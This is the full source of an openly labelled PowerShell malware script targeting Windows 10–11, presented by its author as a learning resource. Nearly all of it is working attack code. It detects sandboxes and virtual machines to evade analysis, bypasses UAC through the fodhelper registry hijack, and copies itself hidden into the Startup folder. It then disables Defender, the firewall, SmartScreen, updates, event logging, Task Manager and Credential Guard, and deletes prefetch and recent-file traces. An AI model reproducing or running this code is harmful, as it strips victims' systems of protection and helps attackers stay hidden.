# |‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾|‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾|
# |                                    |   ___                         _         ____    _                          |
# | Title        : Fuck WinSecurity    |  |_ _|   __ _   _ __ ___     (_)  ___  |  _ \  (_)   __ _   _   _    ___   |
# | Author       : root@isPique:~$     |   | |   / _` | | '_ ` _ \    | | / __| | |_) | | |  / _` | | | | |  / _ \  |
# | Version      : 2.0                 |   | |  | (_| | | | | | | |   | | \__ \ |  __/  | | | (_| | | | | | |  __/  |
# | Category     : PowerShell Malware  |  |___|  \__,_| |_| |_| |_|   |_| |___/ |_|     |_|  \__, |  \__,_|  \___|  |
# | Target       : Windows 10 - 11     |                                                        |_|                 |
# | Mode         : Offensive           |                                                                            |
# |                                    |     My crime is that of curiosity                         |\__/,|   (`\    |
# | Socials:                           |      and yea curiosity killed the cat                     |_ _  |.--.) )   |
# | https://github.com/isPique         |       but satisfaction brought him back                   ( T   )     /    |
# | https://instagram.com/omrefarukk   |                                                          (((^_(((/(((_/    |
# |____________________________________|____________________________________________________________________________|

<#
.SYNOPSIS
    This script is designed to disable Window Security.
.NOTES
    This script was NOT optimized to shorten and obfuscate the code but rather intended to have as much readability as possible for new coders to learn!
.LINK
    https://github.com/isPique/Fuck-Windows-Security
#>

# Ignore errors
$ErrorActionPreference = "SilentlyContinue"

# Get the full path and content of the currently running script
$ScriptPath = $MyInvocation.MyCommand.Path
$ExePath = (Get-Process -Id $PID).Path
$FullPath = if ($ScriptPath) { $ScriptPath } else { $ExePath }

# These functions will identify which virtual environment the script is running in.
function Test-ProcessExists {
    param (
        [string[]]$Processes
    )
    foreach ($proc in $Processes) {
        if (Get-Process -Name $proc -ErrorAction SilentlyContinue) {
            return $true
        }
    }
    return $false
}

function Test-ServiceExists {
    param (
        [string[]]$Services
    )
    foreach ($service in $Services) {
        if (Get-Service -Name $service -ErrorAction SilentlyContinue) {
            return $true
        }
    }
    return $false
}

function Test-RegistryKeyExists {
    param (
        [string[]]$Keys
    )
    foreach ($key in $Keys) {
        if (Test-Path "Registry::$key") {
            return $true
        }
    }
    return $false
}

function Test-RegistryValueMatch {
    param (
        [string]$Key,
        [string]$ValueName,
        [string]$Pattern
    )
    try {
        $value = Get-ItemProperty -Path "Registry::$Key" -Name $ValueName -ErrorAction Stop
        if ($value.$ValueName -match $Pattern) {
            return $true
        }
    } catch {
        return $false
    }
    return $false
}

function Get-RegistryValueString {
    param (
        [string]$Key,
        [string]$ValueName
    )
    try {
        $value = Get-ItemProperty -Path "Registry::$Key" -Name $ValueName -ErrorAction Stop
        return $value.$ValueName
    } catch {
        return $null
    }
}

function Test-Parallels {
    $biosVersion = Get-RegistryValueString -Key "HKLM\HARDWARE\DESCRIPTION\System" -ValueName "SystemBiosVersion"
    $videoBiosVersion = Get-RegistryValueString -Key "HKLM\HARDWARE\DESCRIPTION\System" -ValueName "VideoBiosVersion"
    if ($biosVersion -match "parallels" -or $videoBiosVersion -match "parallels") {
        return $true
    }
    return $false
}

function Test-HyperV {
    $physicalHost = Get-RegistryValueString -Key "HKLM\SOFTWARE\Microsoft\Virtual Machine\Guest\Parameters" -ValueName "PhysicalHostNameFullyQualified"
    if ($physicalHost) {
        Write-Host "This is a Hyper-V Virtual Machine running on physical host $physicalHost"
        return $true
    }

    $sfmsvals = Get-ChildItem "Registry::HKLM\SOFTWARE\Microsoft" -Name
    if ($sfmsvals -contains "Hyper-V" -or $sfmsvals -contains "VirtualMachine") {
        return $true
    }

    $biosVersion = Get-RegistryValueString -Key "HKLM\HARDWARE\DESCRIPTION\System" -ValueName "SystemBiosVersion"
    if ($biosVersion -match "vrtual" -or $biosVersion -eq "Hyper-V") {
        return $true
    }

    if (Test-RegistryKeyExists -Keys $keys) {
        return $true
    }

    $hypervServices = @("vmicexchange")
    if (Test-ServiceExists -Services $hypervServices) {
        return $true
    }

    return $false
}

function Test-VMware {
    $vmwareServices = @("vmdebug", "vmmouse", "VMTools", "VMMEMCTL", "tpautoconnsvc", "tpvcgateway", "vmware", "wmci", "vmx86")

    if (Test-ServiceExists -Services $vmwareServices) {
        return $true
    }

    $systemManufacturer = Get-RegistryValueString -Key "HKLM\HARDWARE\DESCRIPTION\System\BIOS" -ValueName "SystemManufacturer"
    if ($systemManufacturer -match "vmware") {
        return $true
    }

    $scsiPort1 = Get-RegistryValueString -Key "HKLM\HARDWARE\DEVICEMAP\Scsi\Scsi Port 1\Scsi Bus 0\Target Id 0\Logical Unit Id 0" -ValueName "Identifier"
    if ($scsiPort1 -match "vmware") {
        return $true
    }

    if (Test-RegistryValueMatch -Key "HKLM\SYSTEM\ControlSet001\Control\Class\{4D36E968-E325-11CE-BFC1-08002BE10318}\0000" -ValueName "DriverDesc" -Pattern "cl_vmx_svga|VMWare") {
        return $true
    }

    $vmwareProcs = @("vmtoolsd", "vmwareservice", "vmwaretray", "vmwareuser")

    if (Test-ProcessExists -Processes $vmwareProcs) {
        return $true
    }

    return $false
}

function Test-VirtualBox {
    $vboxProcs = @("vboxservice", "vboxtray")
    $vboxServices = @("VBoxMouse", "VBoxGuest", "VBoxService", "VBoxSF", "VBoxVideo")

    if (Test-ServiceExists -Services $vboxServices -or Test-ProcessExists -Processes $vboxProcs) {
        return $true
    }

    $keys = @("HKLM\HARDWARE\ACPI\DSDT\VBOX__")
    if (Test-RegistryKeyExists -Keys $keys) {
        return $true
    }

    for ($i = 0; $i -le 2; $i++) {
        if (Test-RegistryValueMatch -Key "HKLM\HARDWARE\DEVICEMAP\Scsi\Scsi Port $i\Scsi Bus 0\Target Id 0\Logical Unit Id 0" -ValueName "Identifier" -Pattern "vbox") {
            return $true
        }
    }

    $biosVersion = Get-RegistryValueString -Key "HKLM\HARDWARE\DESCRIPTION\System" -ValueName "SystemBiosVersion"
    $videoBiosVersion = Get-RegistryValueString -Key "HKLM\HARDWARE\DESCRIPTION\System" -ValueName "VideoBiosVersion"
    if ($biosVersion -match "vbox" -or $videoBiosVersion -match "virtualbox") {
        return $true
    }

    $systemProductName = Get-RegistryValueString -Key "HKLM\HARDWARE\DESCRIPTION\System\BIOS" -ValueName "SystemProductName"
    if ($systemProductName -match "virtualbox") {
        return $true
    }

    return $false
}

function Test-Xen {
    $xenProcs = @("xenservice")
    $xenServices = @("xenevtchn", "xennet", "xennet6", "xensvc", "xenvdb")

    if (Test-ProcessExists -Processes $xenProcs -or Test-ServiceExists -Services $xenServices) {
        return $true
    }

    $keys = @("HKLM\HARDWARE\ACPI\DSDT\Xen")
    if (Test-RegistryKeyExists -Keys $keys) {
        return $true
    }

    $systemProductName = Get-RegistryValueString -Key "HKLM\HARDWARE\DESCRIPTION\System\BIOS" -ValueName "SystemProductName"
    if ($systemProductName -match "xen") {
        return $true
    }

    return $false
}

function Test-QEMU {
    $biosVersion = Get-RegistryValueString -Key "HKLM\HARDWARE\DESCRIPTION\System" -ValueName "SystemBiosVersion"
    $videoBiosVersion = Get-RegistryValueString -Key "HKLM\HARDWARE\DESCRIPTION\System" -ValueName "VideoBiosVersion"
    if ($biosVersion -match "qemu" -or $videoBiosVersion -match "qemu") {
        return $true
    }

    $scsiPort0 = Get-RegistryValueString -Key "HKLM\HARDWARE\DEVICEMAP\Scsi\Scsi Port 0\Scsi Bus 0\Target Id 0\Logical Unit Id 0" -ValueName "Identifier"
    $systemManufacturer = Get-RegistryValueString -Key "HKLM\HARDWARE\DESCRIPTION\System\BIOS" -ValueName "SystemManufacturer"
    if ($scsiPort0 -match "qemu|virtio" -or $systemManufacturer -match "qemu") {
        return $true
    }

    if (Test-RegistryValueMatch -Key "HKLM\HARDWARE\DESCRIPTION\System\CentralProcessor\0" -ValueName "ProcessorNameString" -Pattern "qemu") {
        return $true
    }

    $keys = @("HKLM\HARDWARE\ACPI\DSDT\BOCHS_")
    if (Test-RegistryKeyExists -Keys $keys) {
        return $true
    }

    return $false
}

# Function to detect if script is running in a virtual environment
function Invoke-DetectVirtualMachine {
    if (Test-Parallels) {
        return $false
    } elseif (Test-HyperV) {
        return $false
    } elseif (Test-VMware) {
        return $false
    } elseif (Test-VirtualBox) {
        return $false
    } elseif (Test-Xen) {
        return $false
    } elseif (Test-QEMU) {
        return $false
    } else {
        return $true
    }
}

# If script is running in a virtual environment delete itself. If not, just continue
if (-not (Invoke-DetectVirtualMachine)) {
    if ($ScriptPath) {
        Remove-Item -Path $FullPath -Force
    } else {
        Start-Process powershell.exe -ArgumentList "-NoProfile -Command `"Remove-Item -Path '$FullPath' -Force -ErrorAction SilentlyContinue`"" -WindowStyle Hidden
    }
}

# Define the startup path for replicating
$startupPath = Join-Path $env:APPDATA -ChildPath 'Microsoft\Windows\Start Menu\Programs\Startup\'

# Function to check if the script is running as admin
function Test-Admin {
    return (New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

# Function to replicate the script to the startup folder
function Invoke-SelfReplication {
    $replicated = [System.IO.Path]::Combine($startupPath, [System.IO.Path]::GetRandomFileName() + [System.IO.Path]::GetExtension($FullPath))
    if (-not (Test-Path ($startupPath + [System.IO.Path]::GetFileName($FullPath)))) {
        Set-Content -Path $replicated -Value (Get-Content -Path $FullPath -Raw)
        (Get-Item $replicated).Attributes = 'Hidden'
    }
}

# Function to leave no traces
function Invoke-SelfDestruction {
    # Remove registry keys related to ms-settings
    Remove-Item -Path "HKCU:\Software\Classes\ms-settings\shell" -Recurse -Force

    # Delete prefetch files related to this script
    Get-ChildItem -Path "$env:SystemRoot\Prefetch" -Filter "*POWERSHELL*.pf" | Remove-Item -Force
    $scriptName = [System.IO.Path]::GetFileNameWithoutExtension($FullPath)
    $prefetchFiles = Get-ChildItem -Path "$env:SystemRoot\Prefetch" -Filter "$scriptName*.pf"
    if ($prefetchFiles) {
        foreach ($file in $prefetchFiles) {
            Remove-Item -Path $file.FullName -Force
        }
    }

    # Delete all the shortcut (.lnk) files that have been accessed or modified within the last day
    $recentFiles = Get-ChildItem -Path "$env:APPDATA\Microsoft\Windows\Recent" | Where-Object { $_.LastWriteTime -ge ((Get-Date).AddDays(-1)) }
    if ($recentFiles) {
        foreach ($file in $recentFiles) {
            Remove-Item -Path $file.FullName -Recurse -Force
        }
    }

    # Delete itself if the script isn't in startup; if it is, then rename it with a random name every execution to reduce the risk of detection
    if (-not (Test-Path ($startupPath + [System.IO.Path]::GetFileName($FullPath)))) {
        if ($ScriptPath) {
            Remove-Item -Path $FullPath -Force
        } else {
            Start-Process powershell.exe -ArgumentList "-NoProfile -Command `"Remove-Item -Path '$FullPath' -Force -ErrorAction SilentlyContinue`"" -WindowStyle Hidden
        }
    } else {
        Rename-Item $FullPath -NewName ([System.IO.Path]::GetRandomFileName() + [System.IO.Path]::GetExtension($FullPath)) -Force
    }
}

# Function to set registry properties
function Set-RegistryProperties {
    param (
        [string]$path,
        [hashtable]$properties
    )

    if (-not (Test-Path $path)) {
        New-Item -Path $path -Force | Out-Null
    }

    foreach ($key in $properties.Keys) {
        Set-ItemProperty -Path $path -Name $key -Value $properties[$key] -Type DWord -Force
    }
}

# Privilege Escalation
if (-not (Test-Admin)) {
    $value = "`"powershell.exe`" -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$FullPath`""
    # Check whether the script runs as a powershell script (.ps1) or an executable (.exe) file
    if ($MyInvocation.MyCommand.CommandType -ne 'ExternalScript') {
        $value = "`"$FullPath`""
    }

    # If not running as admin, set reg keys to execute the script with bypassing User Account Control (UAC)
    New-Item -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Force | Out-Null
    Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "(Default)" -Value $value -Force
    New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "DelegateExecute" -PropertyType String -Force | Out-Null

    # Trigger the UAC prompt by running fodhelper
    Start-Process "fodhelper.exe" -WindowStyle Hidden

    # UAC bypassed here!

    # Exit the script to allow the rest run as admin
    exit
}

# If running as admin, perform the registry modifications

# Define the reg paths
$baseKey = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
$realTimeProtectionKey = "$baseKey\Real-Time Protection"
$firewallPath = "HKLM:\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy"

# First, disable security notifications shown by Windows
Set-RegistryProperties -path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.SecurityAndMaintenance" -properties @{"Enabled" = 0}
Set-RegistryProperties -path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" -properties @{"DisableNotifications" = 1}

# Disable Windows Defender features
Set-RegistryProperties -path $baseKey -properties @{
    "DisableAntiSpyware" = 1 # Main disabling
    "DisableApplicationGuard" = 1
    "DisableControlledFolderAccess" = 1
    "DisableCredentialGuard" = 1
    "DisableIntrusionPreventionSystem" = 1
    "DisableIOAVProtection" = 1
    "DisableRealtimeMonitoring" = 1
    "DisableRoutinelyTakingAction" = 1
    "DisableSpecialRunningModes" = 1
    "DisableTamperProtection" = 1
    "PUAProtection" = 0
    "ServiceKeepAlive" = 0
}

Set-RegistryProperties -path $realTimeProtectionKey -properties @{
    "DisableBehaviorMonitoring" = 1
    "DisableBlockAtFirstSeen" = 1
    "DisableCloudProtection" = 1
    "DisableOnAccessProtection" = 1
    "DisableScanOnRealtimeEnable" = 1
    "DisableScriptScanning" = 1
    "SubmitSamplesConsent" = 2
    "DisableNetworkProtection" = 1
}

# Disable Windows Firewall
Set-RegistryProperties -path "$firewallPath\DomainProfile" -properties @{"EnableFirewall" = 0; "DisableNotifications" = 1}
Set-RegistryProperties -path "$firewallPath\StandardProfile" -properties @{"EnableFirewall" = 0; "DisableNotifications" = 1}
Set-RegistryProperties -path "$firewallPath\PublicProfile" -properties @{"EnableFirewall" = 0; "DisableNotifications" = 1}

# Disable Windows Defender SmartScreen
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off" -Type String -Force
Set-RegistryProperties -path "HKCU:\SOFTWARE\Microsoft\Edge\SmartScreenEnabled" -properties @{"(Default)" = 0}
Set-RegistryProperties -path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\AppHost" -properties @{"EnableWebContentEvaluation" = 0}

# Disable Automatic Updates
Set-RegistryProperties -path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" -properties @{"NoAutoUpdate" = 1}
Set-RegistryProperties -path "HKLM:\SYSTEM\CurrentControlSet\Services\wuauserv" -properties @{"Start" = 4}

# Disable System Restore
Set-RegistryProperties -path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" -properties @{"DisableSR" = 1; "DisableConfig" = 1}
Set-RegistryProperties -path "HKLM:\SYSTEM\CurrentControlSet\Services\srservice" -properties @{"Start" = 4}

# Disable Task Manager
Set-RegistryProperties -path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -properties @{"DisableTaskMgr" = 1}

# Disable Command Prompt
Set-RegistryProperties -path "HKCU:\Software\Policies\Microsoft\Windows\System" -properties @{"DisableCMD" = 1}

# Disable Remote Desktop Connections
Set-RegistryProperties -path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" -properties @{"fDenyTSConnections" = 1}

# Disable User Account Control (UAC)
Set-RegistryProperties -path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -properties @{"EnableLUA" = 0}

# Disable Windows Security Center
Set-RegistryProperties -path "HKLM:\SYSTEM\CurrentControlSet\Services\wscsvc" -properties @{"Start" = 4}

# Disable Error Reporting to Microsoft
Set-RegistryProperties -path "HKLM:\SOFTWARE\Microsoft\Windows\Windows Error Reporting" -properties @{"Disabled" = 1}

# Disable Remote Assistance Connections
Set-RegistryProperties -path "HKLM:\SYSTEM\CurrentControlSet\Control\Remote Assistance" -properties @{"fAllowToGetHelp" = 0}

# Disable the service responsible for troubleshooting Windows Update
Set-RegistryProperties -path "HKLM:\SYSTEM\CurrentControlSet\Services\WaaSMedicSvc" -properties @{"Start" = 4}

# Disable Background Intelligent Transfer Service (BITS), used by Windows Update and other applications for file transfers
Set-RegistryProperties -path "HKLM:\SYSTEM\CurrentControlSet\Services\BITS" -properties @{"Start" = 4}

# Disable Windows Script Host, preventing scripts from running
Set-RegistryProperties -path "HKLM:\Software\Microsoft\Windows Script Host\Settings" -properties @{"Enabled" = 0}

# Disable Windows Event Logging
Set-RegistryProperties -path "HKLM:\SYSTEM\CurrentControlSet\Services\EventLog" -properties @{"Start" = 4}

# Disable Windows Defender Services
Set-RegistryProperties -path "HKLM:\SYSTEM\CurrentControlSet\Services\SecurityHealthService" -properties @{"Start" = 4}

# Disable Windows Search Service
Set-RegistryProperties -path "HKLM:\SYSTEM\CurrentControlSet\Services\WSearch" -properties @{"Start" = 4}

# Disable Windows Automatic Maintenance
Set-RegistryProperties -path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\Maintenance" -properties @{"MaintenanceDisabled" = 1}

# Disable Windows Defender Credential Guard
Set-RegistryProperties -path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\DeviceGuard" -properties @{"LsaCfgFlags" = 0}
Set-RegistryProperties -path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -properties @{"LsaCfgFlags" = 0}

# Disable Device Guard
Set-RegistryProperties -path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard" -properties @{"EnableVirtualizationBasedSecurity" = 0; "RequirePlatformSecurityFeatures" = 0; "HVCIMATRequired" = 0}

# Disable Application Guard
Set-RegistryProperties -path "HKLM:\SOFTWARE\Microsoft\Hvsi" -properties @{"Enabled" = 0}

# Disable Windows Defender Exploit Guard
Set-RegistryProperties -path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Windows Defender Exploit Guard" -properties @{"EnableExploitProtection" = 0}

# Disable Telemetry and Data Collection
Set-RegistryProperties -path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\DataCollection" -properties @{"AllowTelemetry" = 0}

# Disable OneDrive
Set-RegistryProperties -path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\OneDrive" -properties @{"DisableFileSyncNGSC" = 1}

# Disable Cortana
Set-RegistryProperties -path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Windows Search" -properties @{"AllowCortana" = 0}

# Call the Invoke-SelfReplication function
Invoke-SelfReplication

# Call the Invoke-SelfDestruction function
Invoke-SelfDestruction
